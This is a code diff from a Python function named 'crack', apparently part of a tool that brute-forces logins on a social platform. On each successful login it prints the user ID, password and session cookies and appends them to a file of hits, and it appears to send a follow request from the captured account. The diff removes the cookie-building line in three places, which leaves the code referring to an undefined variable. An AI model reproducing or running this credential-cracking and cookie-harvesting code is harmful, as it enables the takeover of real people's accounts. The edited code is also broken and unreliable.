@@ -174,7 +174,6 @@ def crack(uid, pww, total_idz):
                 json_response = response.json()
                 if json_response.get('status') == 'ok':
                    if json_response.get('authenticated') == True:
-                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
@@ -187,7 +186,6 @@ def crack(uid, pww, total_idz):
                            print("Failed to send follow request.")
                         return True
                    elif json_response.get('auth_token'):
-                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
@@ -200,7 +198,6 @@ def crack(uid, pww, total_idz):
                            print("Failed to send follow request.")
                         return True
                    elif 'sessionid' in session_cookies:
-                        cookies = ";".join([f"{key}={value}" for key, value in cookies_dict.items()])
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookies}\n")
